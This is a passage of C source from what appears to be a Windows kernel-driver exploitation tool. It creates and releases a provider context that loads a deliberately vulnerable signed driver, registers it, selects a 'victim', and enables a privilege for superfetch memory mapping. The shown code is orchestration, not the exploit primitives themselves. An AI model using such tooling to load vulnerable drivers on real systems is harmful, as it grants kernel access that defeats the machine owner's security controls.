                prov->LoadData->VictimId = KDU_VICTIM_DEFAULT;
            Context->Victim = &g_KDUVictims[prov->LoadData->VictimId];
        }

        PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
        SIZE_T length = 64 +
            (_strlen(provLoadData->DriverName) * sizeof(WCHAR)) +
            CurrentDirectory->Length;

        Context->DriverFileName = (LPWSTR)supHeapAlloc(length);
        if (Context->DriverFileName == NULL) {
            supHeapFree(Context);
            Context = NULL;
        }
        else {

            Context->ShellVersion = ShellCodeVersion;
            Context->NtBuildNumber = NtBuildNumber;
            Context->ModuleBase = moduleBase;
            Context->NtOsBase = supGetNtOsBase();
            Context->MaximumUserModeAddress = supQueryMaximumUserModeAddress();
            Context->MemoryTag = supSelectNonPagedPoolTag();

            length = CurrentDirectory->Length / sizeof(WCHAR);

            _strncpy(Context->DriverFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            _strcat(Context->DriverFileName, TEXT("\\"));
            _strcat(Context->DriverFileName, provLoadData->DriverName);
            _strcat(Context->DriverFileName, TEXT(".sys"));

            if (Context->Provider->Callbacks.StartVulnerableDriver(Context)) {

                Context->ProviderState = StateLoaded;

                //
                // Register (unlock, send love letter, whatever this provider want first) driver.
                //
                if ((PVOID)Context->Provider->Callbacks.RegisterDriver) {

                    PVOID regParam;

                    if (provLoadData->NoVictim) {
                        regParam = (PVOID)Context;
                    }
                    else {
                        regParam = UlongToPtr(provLoadData->ResourceId);
                    }

                    if (!Context->Provider->Callbacks.RegisterDriver(
                        Context->DeviceHandle,
                        regParam))
                    {

                        supShowWin32Error("[!] Cannot register provider driver", GetLastError());

                        //
                        // This is hard error for some providers, abort execution.
                        //
                        KDUFallBackOnLoad(&Context);

                    }
                }

            }
            else {
                supHeapFree(Context->DriverFileName);
                supHeapFree(Context);
                Context = NULL;
            }

        }

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return Context;
}

/*
* KDUProviderRelease
*
* Purpose:
*
* Release Provider context, free resources and unload driver.
*
*/
VOID WINAPI KDUProviderRelease(
    _In_ KDU_CONTEXT * Context)
{
    FUNCTION_ENTER_MSG(__FUNCTION__);

    if (Context) {

        if (Context->ProviderState == StateLoaded) {

            //
            // Unregister driver if supported.
            //
            if ((PVOID)Context->Provider->Callbacks.UnregisterDriver) {
                Context->Provider->Callbacks.UnregisterDriver(
                    Context->DeviceHandle,
                    (PVOID)Context);
            }

            if (Context->DeviceHandle) {
                NtClose(Context->DeviceHandle);
                Context->DeviceHandle = NULL;
            }

            if (Context->Provider->LoadData->NoUnloadSupported) {
                supPrintfEvent(kduEventInformation,
                    "[~] This driver does not support unload procedure, reboot PC to get rid of it\r\n");
            }
            else {

                //
                // Unload driver.
                //
                Context->Provider->Callbacks.StopVulnerableDriver(Context);

            }

            Context->ProviderState = StateUnloaded;
        }

        if (Context->DriverFileName) {
            supHeapFree(Context->DriverFileName);
            Context->DriverFileName = NULL;
        }

        //
        // Free provider specific globals.
        //
        if (Context->Provider->LoadData->UseSuperfetch)
            supFreeSuperfetchMemoryMapCache();

        supHeapFree(Context);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}

/*
* KDUValidatePrerequisitesForSuperfetch
*
* Purpose:
*
* Enable privilege for superfetch aware provider.
*
*/
BOOL WINAPI KDUValidatePrerequisitesForSuperfetch(
    _In_ PKDU_CONTEXT Context)
{
    BOOLEAN oldValue = FALSE;
    NTSTATUS ntStatus;

    //
    // Only for superfetch aware providers.
    //
    if (Context->Provider->LoadData->UseSuperfetch) {

        //
        // Only enable privilege, defer map building.
        //
        ntStatus = RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &oldValue);
        if (!NT_SUCCESS(ntStatus)) {
            supPrintfEvent(kduEventError,
                "[-] Failed to enable SE_PROF_SINGLE_PROCESS_PRIVILEGE (0x%lX)\r\n", ntStatus);
            return FALSE;
        }

        supPrintfEvent(kduEventInformation,
            "[+] Superfetch prerequisites validated, SE_PROF_SINGLE_PROCESS_PRIVILEGE adjusted\r\n");

    }
    return TRUE;
}
